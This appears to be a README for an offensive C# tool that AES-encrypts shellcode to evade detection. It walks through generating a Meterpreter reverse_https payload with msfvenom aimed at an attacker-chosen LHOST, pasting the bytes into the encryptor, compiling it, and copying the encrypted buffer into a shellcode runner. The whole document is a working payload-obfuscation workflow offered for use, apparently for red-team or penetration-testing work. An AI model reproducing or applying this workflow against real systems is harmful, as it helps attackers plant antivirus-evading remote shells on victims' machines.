# AES Shellcode Encryptor

## Files

| File | Purpose |
|---|---|
| `aes-shellcode-encryption.cs` | C# encryptor — AES-256-CBC encrypts shellcode, outputs C# byte array |

## Usage

**1. Generate shellcode:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=<IP> LPORT=443 -f csharp -o shellcode.txt
```

**2. Replace the shellcode bytes in `aes-shellcode-encryption.cs`:**
```csharp
byte[] shellcode = new byte[] { 0xfc, 0x48, 0x83, ... };  // ← paste your msfvenom output here
```

**3. Compile:**

**Visual Studio:**
1. Create a new project → Console App (.NET Framework)
2. Replace `Program.cs` with the contents of `aes-shellcode-encryption.cs`
3. Set configuration to **Release** and platform to **x64**
4. Build → Build Solution (`Ctrl+Shift+B`)
5. Exe is in `bin\x64\Release\`

**Command line:**
```powershell
csc /target:exe /platform:x64 /optimize+ /out:Encrypter.exe aes-shellcode-encryption.cs
```

**4. Run the encryptor:**
```powershell
.\Encrypter.exe
```

The output is your encrypted `buf` — copy it and paste into whichever runner you need.
